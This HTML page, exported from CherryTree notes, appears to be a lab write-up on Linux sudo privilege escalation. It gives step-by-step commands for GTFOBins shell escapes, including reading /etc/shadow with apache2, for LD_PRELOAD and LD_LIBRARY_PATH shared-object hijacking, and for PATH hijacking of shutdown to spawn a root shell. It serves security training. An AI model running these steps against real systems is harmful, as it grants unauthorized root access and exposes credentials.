<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Sudo</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Sudo</h1><br/><strong><h1>Sudo</h1></strong><br /><br /><strong><h2>A) Shell Escape Sequences</h2></strong><br /><br />List the programs which sudo allows your user to run:<br /><br /><strong>sudo -l</strong><br /><br />Visit GTFOBins (<strong>https://gtfobins.github.io</strong>) and search for some of the program names. If the program is listed with &quot;sudo&quot; as a function, you can use it to elevate privileges, usually via an escape sequence.<br /><br />Choose a program from the list and try to gain a root shell, using the instructions from GTFOBins.<br /><br />For an extra challenge, try to gain a root shell using all the programs on the list!<br /><br /><strong>Example</strong> (If Apache is given sudo access)<br /><strong>sudo apache2 -f /etc/shadow</strong><br /><br /><strong>Note:</strong> This technique is used to read the first line of any file.<br /><br /><br /><strong><h2>B) Environment Variables</h2></strong><br /><br />Sudo can be configured to inherit certain environment variables from the user&#39;s environment.<br /><br />Check which environment variables are inherited (look for the env_keep options):<br /><br /><strong>sudo -l</strong><br /><br /><strong>LD_PRELOAD</strong> and <strong>LD_LIBRARY_PATH</strong> are both inherited from the user&#39;s environment. <strong>LD_PRELOAD</strong> loads a shared object before any others when a program is run. <strong>LD_LIBRARY_PATH</strong> provides a list of directories where shared libraries are searched for first.<br /><br /><strong><span style="text-decoration:underline;">Using LD_PRELOAD</span></strong><br /><br />Create a shared object using the code located at /home/user/tools/sudo/preload.c:<br /><br /><strong>gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c</strong><br /><br />Run one of the <strong>programs</strong> you are <strong>allowed</strong> to run via <strong>sudo</strong> (listed when running sudo -l), while setting the LD_PRELOAD environment variable to the full path of the new shared object:<br /><br /><strong>sudo LD_PRELOAD=/tmp/preload.so program-name-here</strong><br /><br />A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well.<br /><br /><strong>Example</strong><br /><img src="images/221-1.png" alt="images/221-1.png" /><br /><br /><strong><span style="text-decoration:underline;">Using LD_LIBRARY_PATH</span></strong><br /><br />Run <strong>ldd</strong> against the apache2 program file to see which <strong>shared libraries</strong> are used by the program:<br /><br /><strong>ldd /usr/sbin/apache2</strong><br /><br />Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:<br /><br /><strong>gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c</strong><br /><br />Run <strong>apache2</strong> using <strong>sudo</strong>, while settings the <strong>LD_LIBRARY_PATH</strong> environment variable to <strong>/tmp</strong> (where we output the compiled shared object):<br /><br /><strong>sudo LD_LIBRARY_PATH=/tmp apache2</strong><br /><br />A root shell should spawn. Exit out of the shell. Try renaming /tmp/libcrypt.so.1 to the name of another library used by apache2 and re-run apache2 using sudo again. Did it work? If not, try to figure out why not, and how the library_path.c code could be changed to make it work.<br /><br /><strong>Example</strong><br /><img src="images/221-2.png" alt="images/221-2.png" /><br /><br /><strong>Note:</strong> If we want to consider any other library file and then we need to change the name accordingly in the <strong>library_path.c</strong> file. (Research)<br /><br /><strong><h2>C) Path Variable in Sudo</h2></strong><br /><br />Lets check sudo on the Target Machine:<br /><img src="images/221-3.png" alt="images/221-3.png" /><br /><br />Normal Sudo<br /><img src="images/221-4.png" alt="images/221-4.png" /><br /><br />As we can see, the <strong>secure_path</strong> is not present on the target machine. This means if any executible uses any program without absolute path. We can use this to plant our program in a different path.<br /><br />Lets examine the <strong>/usr/sbin/shutdown</strong> binary by taking it to kali machine.<br /><br /><span style="text-decoration:underline;">Target Machine</span>: <strong>cp /usr/sbin/shutdown /tmp</strong><br /><span style="text-decoration:underline;">Attacker Machine</span>: <strong>scp -P 9090 fox@10.10.93.57:/tmp/shutdown .</strong><br /><br /><strong><span style="text-decoration:underline;">Examine the Shutdown Binary using radare2:</span></strong><br /><br /><strong>radare2 -AAA &lt;Filename&gt;<br />pdf @main</strong><br /><br /><img src="images/221-5.png" alt="images/221-5.png" /><br /><br />As we can see, the <strong>poweroff</strong> is called <strong>without absoulute path</strong>.<br />We need to copy the <strong>/bin/bash</strong> binary to <strong>/tmp</strong> and rename as <strong>poweroff</strong> and <strong>add the /tmp path</strong> while calling the <strong>shutdown using sudo</strong>.<br /><br /><strong>cp /bin/bash /tmp/poweroff</strong><br /><br />Then run the sudo command along with PATH as follows:<br /><br /><strong>sudo &quot;PATH=/tmp:$PATH&quot; /usr/sbin/shutdown</strong><br /><br /><img src="images/221-6.png" alt="images/221-6.png" /><br /><br /><br /><strong><h2>END</h2></strong></div>
</body>
</html>
